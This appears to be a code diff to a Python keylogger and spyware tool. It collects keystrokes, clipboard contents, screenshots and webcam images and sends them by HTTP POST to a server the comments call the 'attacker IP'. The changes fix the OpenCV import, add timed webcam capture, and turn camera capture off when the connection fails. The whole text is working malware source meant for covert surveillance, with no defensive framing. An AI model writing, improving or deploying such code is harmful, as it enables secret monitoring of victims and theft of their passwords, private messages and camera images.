@@ -22,18 +22,20 @@ from PIL import ImageGrab
 import io
 import base64
 import time
-import cv
+import cv2
 
 # Global variables to store captured data
 keystrokes = ""  # Buffer to store captured keystrokes
 clipboard_data = ""  # Global variable to store clipboard content
 previous_clipboard_data = ""  # To track the previous clipboard content
+camera_capture_active = True  # Flag to control camera capture
 
 # Configuration settings
 server_ip = "127.0.0.1"  # Change this based on your attacker IP
 server_port = 8080  # Change this based on your specified port
-send_interval = 5 # Interval (in seconds) between sending keystrokes and clipboard data (Change if needed)
+send_interval = 10 # Interval (in seconds) between sending keystrokes and clipboard data (Change if needed)
 screenshot_interval = 10 # Interval (in seconds) between sending screenshots (Change if needed)
+image_capture_interval = 10 # Interval (in seconds) between capturing camera images (Change if needed)
 
 # Track whether Ctrl, Alt, Shift is pressed
 ctrl_pressed = False
@@ -53,6 +55,8 @@ def capture_screenshot():
         return ""
 
 def capture_camera_image():
+    if not camera_capture_active:
+        return ""
     try:
         # Open a connection to the webcam (default is camera index 0)
         cap = cv2.VideoCapture(0)
@@ -74,23 +78,22 @@ def capture_camera_image():
     except Exception as e:
         print(f"Couldn't capture camera image: {e}")
         return ""
-    
+
 def send_data():
-    global keystrokes, clipboard_data
+    global keystrokes, clipboard_data, camera_capture_active
     last_screenshot_time = time.time()
-    screenshot_base64 = ""
-    camera_image_base64 = ""
+    last_image_capture_time = time.time()
     while True:
         try:
             current_time = time.time()
-            screenshot_base64 = ""  # Default empty value
+            screenshot_base64 = ""
             if current_time - last_screenshot_time >= screenshot_interval:
                 screenshot_base64 = capture_screenshot()
                 last_screenshot_time = current_time
+            camera_image_base64 = ""
             if current_time - last_image_capture_time >= image_capture_interval:
                 camera_image_base64 = capture_camera_image()
                 last_image_capture_time = current_time
-               
             # Only include clipboard data if it has a value
             payload_data = {
                 "keyboardData": keystrokes,
@@ -102,10 +105,14 @@ def send_data():
             payload = json.dumps(payload_data)
             # Send POST request to the server with the keystrokes, clipboard data, and screenshot
             r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
-            
             # Clear the buffer after successful send
             keystrokes = ""
             clipboard_data = ""
+            # If we successfully sent data, camera capture is active
+            camera_capture_active = True
+        except requests.ConnectionError as e:
+            print(f"Couldn't complete request: {e}")
+            camera_capture_active = False
         except Exception as e:
             print(f"Couldn't complete request: {e}")
         # Wait for the specified interval before sending again
